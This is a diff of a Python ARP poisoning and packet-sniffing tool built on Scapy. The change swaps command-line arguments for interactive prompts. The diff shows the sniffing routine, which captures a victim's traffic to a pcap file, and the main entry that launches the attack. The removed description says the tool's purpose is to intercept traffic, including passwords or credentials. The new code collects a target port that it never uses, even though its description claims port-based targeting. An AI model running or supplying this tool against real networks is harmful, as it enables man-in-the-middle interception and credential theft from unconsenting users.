@@ -3,21 +3,18 @@
 # Author: Nicholas Fisher
 # Date: March 4th 2024
 # Description of Script
-# The provided Python script implements an ARP poisoning attack tool using Scapy. ARP poisoning 
-# is a technique used to intercept traffic on a switched network. The script takes three 
-# command-line arguments: the IP address of the victim machine, the IP address of the gateway 
-# router, and the network interface to use. It then initiates an ARP poisoning attack by sending 
-# spoofed ARP packets to the victim and the gateway, tricking them into sending their traffic 
-# through the attacker's machine. The attacker can then sniff the traffic passing through 
-# and potentially intercept sensitive information such as passwords or credentials. 
-# Please use the script in the following syntax below
-# python script.py <victim_ip> <gateway_ip> <interface>
+# The upgraded script allows users to initiate an ARP poisoning attack and packet sniffing on a
+# remote host by inputting the target host's IP address, port, gateway IP address, and interface.
+# Leveraging Scapy and multiprocessing, it efficiently handles packet manipulation and parallel 
+# processing. Upon execution, it prompts users for necessary information, initializes the attack,
+# and subsequently sniffs packets directed to the target host, providing a seamless and
+# interactive experience.
 #################################################################################################
-# Import necessary modules
 from multiprocessing import Process  # For creating separate processes
 from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)  # Scapy modules for packet manipulation
 import sys  # For accessing command line arguments
 import time  # For time-related functions
+import os  # For clearing the screen
 
 # Function to get MAC address of a given IP address
 def get_mac(target_ip):
@@ -87,13 +84,13 @@ class Arper:
     # Method to sniff packets
     def sniff(self):
         time.sleep(5)  # Wait for ARP poisoning to take effect
-        print('Please enter sniff count: ')
-        count = int(input())  # Get the number of packets to sniff
-        print(f'Sniffing {count} packets!')
+        os.system('clear')  # Clear the screen for better interaction
+        print('Sniffing packets...')
+        count = int(input('Please enter the number of packets to sniff: '))
         bpf_filter = f'ip host {self.victim}'  # Filter packets for victim's IP
         packets = sniff(count=count, filter=bpf_filter, iface=self.interface)  # Sniff packets
         wrpcap('arper.pcap', packets)  # Write sniffed packets to a file
-        print('Got the packets!')
+        print('Sniffing complete!')
         self.restore()  # Restore ARP tables
         self.poison_thread.terminate()  # Terminate ARP poisoning process
         print('Finished!')
@@ -107,13 +104,13 @@ class Arper:
 
 # Main entry point of the script
 if __name__ == '__main__':
-    # Check if the correct number of command line arguments is provided
-    if len(sys.argv) != 4:
-        print('Usage: python script.py <victim_ip> <gateway_ip> <interface>')
-        sys.exit(1)
-    # Get victim IP, gateway IP, and interface from command line arguments
-    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
+    # Get target host IP address and port from user input
+    target_ip = input('Enter the target host IP address: ')
+    target_port = input('Enter the target port: ')
+    # Get gateway IP and interface from user input
+    gateway = input('Enter the gateway IP address: ')
+    interface = input('Enter the interface: ')
     # Create an instance of Arper class
-    myarp = Arper(victim, gateway, interface)
+    myarp = Arper(target_ip, gateway, interface)
     # Run the ARP poisoning attack
     myarp.run()
